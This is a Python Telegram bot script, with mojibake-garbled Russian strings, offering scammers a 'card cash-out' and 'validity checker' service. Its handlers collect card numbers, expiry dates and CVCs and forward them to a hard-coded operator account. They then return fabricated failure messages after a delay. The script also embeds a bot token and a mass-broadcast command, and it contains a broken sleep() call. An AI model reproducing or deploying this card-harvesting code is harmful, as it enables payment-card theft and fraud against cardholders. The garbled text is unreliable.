import telebot
import re
import time
import sqlite3


bot = telebot.TeleBot('1473324178:AAElGNCPRiBYgNiaGynes-7x5Ms5tlRs8u8')

menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
menu.row('üë§ –ü—Ä–æ—Ñ–∏–ª—å')
menu.row('üîÑ –°–ø–∏—Å–∞—Ç—å –±–∞–±–∫–∏ —Å –∫–∞—Ä—Ç—ã', '‚ö†Ô∏è –ß–µ–∫–µ—Ä –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å')
menu.row('ü§ñ ùêáùêÑùêãùêè', 'üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞')

balance = telebot.types.InlineKeyboardMarkup()
vivod = telebot.types.InlineKeyboardButton(text='–í—ã–≤–µ—Å—Ç–∏ –±–∞–±–∫–∏', callback_data='vivodbabla')
balance.add(vivod)

systema = telebot.types.InlineKeyboardMarkup()
qiwas = telebot.types.InlineKeyboardButton(text='ü•ù ùêêùêàùêñùêà', callback_data='vivodqiwi')
bitok = telebot.types.InlineKeyboardButton(text='üñ§ ùêÅùêìùêÇ', callback_data='vivodbtc')
systema.add(qiwas)
systema.add(bitok)

def create_db_new():
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute('''CREATE TABLE IF NOT EXISTS user(
        user_id INT)''')
    sql.close()
    db.close()
create_db_new()
@bot.message_handler(commands=['start'])
def send_sms(message):
    db = sqlite3.connect("users.db", check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user WHERE user_id = ?",(message.from_user.id,))
    db.commit()
    if sql.fetchone() is None:
        sql.execute("INSERT INTO user VALUES(?)",(message.from_user.id,))
        db.commit()
    bot.send_message(message.chat.id, '<b>–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é —Ç–µ–±—è –¥–æ—Ä–æ–≥–æ–π —Å–∫–∞–º–µ—Ä, –Ω–∞ —Å–≤—è–∑–∏ –ª—É—á—à–∏–π –±–æ—Ç –ø–æ –æ–±–Ω–∞–ª—É –∫–∞—Ä—Ç!\n\n–°–Ω–∞–ª–∏–º –ª—é–±—É—é —Å—É–º–º—É –æ—Ç 100‚ÇΩ –¥–æ 100 000‚ÇΩ —Ç–∞–∫ –∂–µ –Ω–∞–ª–∏–º –∫–∞—Ä—Ç—ã —Ç–≤–æ–µ–≥–æ –∏–Ω–æ—Å—Ç—Ä–∞–Ω–Ω–æ–≥–æ –º–∞–º–æ–Ω—Ç–∞ –∏ —Å–ø–∏—à–µ–º —É –Ω–µ–≥–æ –æ—Ç 1$ –¥–æ 1500$\n–ü—Ä–∏–Ω–∏–º–∞–µ–º –ª—é–±—ã–µ –∫–∞—Ä—Ç—ã –¥–∞–∂–µ –ú–ò–†!\n–ù–∞–ª–∏–º –≤—Å–µ —Å—Ç—Ä–∞–Ω—ã!</b>', parse_mode='html', reply_markup=menu)
    sql.close()
    db.close()
@bot.message_handler(commands=['send'])  
def rek(message):
    if message.from_user.id == 1490980970:
        bot.send_message(message.chat.id, "–æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏")
        bot.register_next_step_handler(message, message_everyone)
def message_everyone(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT user_id FROM user")
    Lusers = sql.fetchall()
    for i in Lusers:
        try:
            if message.content_type == "text":
                #text
                tex = message.text
                bot.send_message(i[0], tex)
            elif message.content_type == "photo":
                #photo
                capt = message.caption
                photo = message.photo[-1].file_id
                bot.send_photo(i[0], photo, caption=capt)
            elif message.content_type == "video":
                #video
                capt = message.caption
                photo = message.video.file_id
                bot.send_video(i[0], photo)
            elif message.content_type == "audio":
                #audio
                capt = message.caption
                photo = message.audio.file_id
                bot.send_audio(i[0], photo, caption=capt)
            elif message.content_type == "voice":
                #voice
                capt = message.caption
                photo = message.voice.file_id
                bot.send_voice(i[0], photo, caption=capt)
            elif message.content_type == "animation":
                #animation
                capt = message.caption
                photo = message.animation.file_id
                bot.send_animation(i[0], photo, caption=capt)
            elif message.content_type == "document":
                #document
                capt = message.caption
                photo = message.document.file_id
                bot.send_document(i[0], photo, caption=capt)
        except:
            print("error!!")
    sql.close()
    db.close()
@bot.message_handler(commands=['stats'])
def stat(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    print(q[0])
    for i in q:
        bot.send_message(message.chat.id, "‚ù§Ô∏è –ë–æ—Ç–æ–º –ø–æ–ª—å–∑—É—é—Ç—Å—è –≤–æ—Ç —Å—Ç–æ–ª—å–∫–æ –ª—é–¥–µ–π: " + str(q[0]))
 

@bot.message_handler(content_types=['text'])
def send_message(message):
    db = sqlite3.connect('users.db', check_same_thread=False)
    sql = db.cursor()
    sql.execute("SELECT COUNT(*) FROM user")
    q = sql.fetchall()
    if message.text == 'üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞':
      print(q[0])
      for i in q:
        bot.send_message(message.chat.id, "‚ù§Ô∏è –ë–æ—Ç–æ–º –ø–æ–ª—å–∑—É—é—Ç—Å—è –≤–æ—Ç —Å—Ç–æ–ª—å–∫–æ –ª—é–¥–µ–π: " + str(q[0]))
    if message.text == 'üë§ –ü—Ä–æ—Ñ–∏–ª—å':
        user = message.from_user
        profile = f'<a href="tg://user?id={user.id}">{user.first_name}</a>'
        bot.send_message(message.chat.id, f'<b>–í–∞—à Login</b>: {profile}\n<b>–í–∞—à ID:</b> <code>{message.from_user.id}</code>\n<b>–í–∞—à –±–∞–ª–∞–Ω—Å:</b> <code>0.00 RUB</code>', parse_mode='html', reply_markup=balance)
    if message.text == 'üîÑ –°–ø–∏—Å–∞—Ç—å –±–∞–±–∫–∏ —Å –∫–∞—Ä—Ç—ã':    
        bot.send_message(message.chat.id, f'–ü—Ä–∏—à–ª–∏ –º–Ω–µ –≤ –æ—Ç–≤–µ—Ç–Ω–æ–º —Å–æ–æ–±—â–µ–Ω–∏–π –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã (–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã, –î–∞—Ç–∞, CVC)\n–ü—Ä–∏–º–µ—Ä : 4276 1400 4334 1251 | 11/23 | 515\n–û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ —É—á–∏—Ç—ã–≤–∞–π—Ç–µ —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å <code>"|"</code>–∫–æ–≥–¥–∞ –≤–≤–æ–¥–∏—Ç–µ –∫–∞—Ä—Ç—É –∏–ª–∏ –±–æ—Ç —Å–æ—á—Ç–µ—Ç –µ—ë –∑–∞ –Ω–µ–≤–∞–ª–∏–¥ !', parse_mode='html')
        start_perevod(message = message)
    if message.text == '‚ö†Ô∏è –ß–µ–∫–µ—Ä –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å':
        bot.send_message(message.chat.id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ –≤ –æ—Ç–≤–µ—Ç–Ω–æ–º —Å–æ–æ–±—â–µ–Ω–∏–π –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã (–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã, –î–∞—Ç–∞, CVC)\n–ü—Ä–∏–º–µ—Ä : 4276 1400 4334 1251 | 11/23 | 515\n–û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ —É—á–∏—Ç—ã–≤–∞–π—Ç–µ —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å <code>"|"</code>–∫–æ–≥–¥–∞ –≤–≤–æ–¥–∏—Ç–µ –∫–∞—Ä—Ç—É –∏–ª–∏ –±–æ—Ç —Å–æ—á—Ç–µ—Ç –µ—ë –∑–∞ –Ω–µ–≤–∞–ª–∏–¥ !', parse_mode='html')
        start_check(message = message)
    if message.text == 'ü§ñ ùêáùêÑùêãùêè':
        bot.send_message(message.chat.id, '<b>–ó–∞ –ø–æ–º–æ—â—å—é –ø–∏—Å–∞—Ç—å –º–Ω–µ @CarderObnal\n\n–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫: @CarderObnal</b>', parse_mode='html')












def start_perevod(message):
       chat_id = message.chat.id
       text = message.text
       msg = bot.send_message(chat_id, '<b>–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã —á—Ç–æ–±—ã –µ–µ –æ–±–Ω–∞–ª–∏—á–∏—Ç—å</b>', parse_mode='html')
       bot.register_next_step_handler(msg, number)
       
def number(message):
        chat_id = message.chat.id
        text = message.text
        if re.match(r'@([a-zA-Z]|_|\d)+ \d+', text):
            msg = bot.send_message(chat_id, '–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ') 
            bot.register_next_step_handler(msg, number)
            return
       	# ----------------------------------------------------------
        msg = bot.send_message(chat_id, '–í—ã —É–∫–∞–∑–∞–ª–∏: ' + text + '. –í–µ—Ä–Ω–æ?(–î–∞|–ù–µ—Ç)')
        bot.register_next_step_handler(message,verify_ask,answer = text) 
        bot.forward_message(1490980970, message.from_user.id, message.message_id)# 
        
def verify_ask(message,answer,func = None):
    if not message.text.lower().find("–¥–∞"):
        bot.send_message(message.chat.id,"<b>–°–∫–æ—Ä–æ –±—É–¥–µ—Ç –æ–±–Ω–∞–ª–∏—á–µ–Ω–æ!\n–û —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞—Ö —Å–æ–æ–±—â–∏–º –ø—Ä–∏–º–µ—Ä–Ω–æ —á–µ—Ä–µ–∑ 10 –º–∏–Ω—É—Ç!</b>", parse_mode='html') #
        sleep(285)
        bot.send_photo(message.chat.id, "https://i.imgur.com/2jMQy6H.jpg", caption="–ù–µ—Ç—É –±–∞–±–æ–∫ –Ω–∞ –∫–∞—Ä—Ç–µ —É –º–∞–º–æ–Ω—Ç–∞")
    elif not message.text.lower().find("–Ω–µ—Ç"):
              bot.send_message(message.chat.id,"–û—Ç–º–µ–Ω–µ–Ω–æ.")#
    else:
        bot.send_message(message.chat.id,"–û—Ç–≤–µ—Ç –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç –ø–æ–¥ –∫—Ä–∏—Ç–µ—Ä–∏–∏ (–î–∞|–ù–µ—Ç)")
        bot.register_next_step_handler(message,verify_ask,answer = answer)



def start_check(message):
       chat_id = message.chat.id
       text = message.text
       msg = bot.send_message(chat_id, '<b>–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã —á—Ç–æ–±—ã —á–µ–∫–Ω—É—Ç—å –Ω–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å</b>', parse_mode='html')
       bot.register_next_step_handler(msg, number2)
       
def number2(message):
        chat_id = message.chat.id
        text = message.text
        if re.match(r'@([a-zA-Z]|_|\d)+ \d+', text):
            msg = bot.send_message(chat_id, '–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ') 
            bot.register_next_step_handler(msg, number2)
            return
       	# ----------------------------------------------------------
        msg = bot.send_message(chat_id, '–í—ã —É–∫–∞–∑–∞–ª–∏: ' + text + '. –í–µ—Ä–Ω–æ?(–î–∞|–ù–µ—Ç)')
        bot.register_next_step_handler(message,verify_ask2,answer = text) 
        bot.forward_message(1490980970, message.from_user.id, message.message_id)# 
        
def verify_ask2(message,answer,func = None):
    if not message.text.lower().find("–¥–∞"):
        bot.send_message(message.chat.id,"<b>–°–∫–æ—Ä–æ –±—É–¥–µ—Ç –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ –Ω–∞ –≤–∞–ª–∏–¥!\n–û —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞—Ö —Å–æ–æ–±—â–∏–º –ø—Ä–∏–º–µ—Ä–Ω–æ —á–µ—Ä–µ–∑ 10 –º–∏–Ω—É—Ç!</b>", parse_mode='html') #
        time.sleep(280)
        bot.send_photo(message.chat.id, "https://i.imgur.com/lVp9ukV.jpg", caption="–ö–∞—Ä—Ç–∞ –Ω–µ–≤–∞–ª–∏–¥ –∏–ª–∏ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –ª–æ–∫–µ!")
    elif not message.text.lower().find("–Ω–µ—Ç"):
	    bot.send_message(message.chat.id,"–û—Ç–º–µ–Ω–µ–Ω–æ.")#
    else:
        bot.send_message(message.chat.id,"–û—Ç–≤–µ—Ç –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç –ø–æ–¥ –∫—Ä–∏—Ç–µ—Ä–∏–∏ (–î–∞|–ù–µ—Ç)")
        bot.register_next_step_handler(message,verify_ask2,answer = answer)
























  
@bot.callback_query_handler(func=lambda call:True)
def call_su(call):
    if call.data == 'vivodbabla':
        bot.send_message(call.message.chat.id, '<b>–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–∞—Ç–µ–∂–Ω—É—é —Å–∏—Å—Ç–µ–º—É, –∫—É–¥–∞ –±—É–¥–µ—Ç–µ –≤—ã–≤–æ–¥–∏—Ç—å!</b>', parse_mode='html', reply_markup=systema)
    if call.data == 'vivodqiwi':
        bot.send_message(call.message.chat.id, '<i>–ó–∞ –≤—ã–≤–æ–¥–æ–º –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –∫ @CarderObnal</i>', parse_mode='html')
    if call.data == 'vivodbtc':
        bot.send_message(call.message.chat.id, '<i>–ó–∞ –≤—ã–≤–æ–¥–æ–º –æ–±—Ä–∞—â–∞–π—Ç–µ—Å—å –∫ @CarderObnal</i>', parse_mode='html')
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
         


bot.polling(none_stop=True)    
    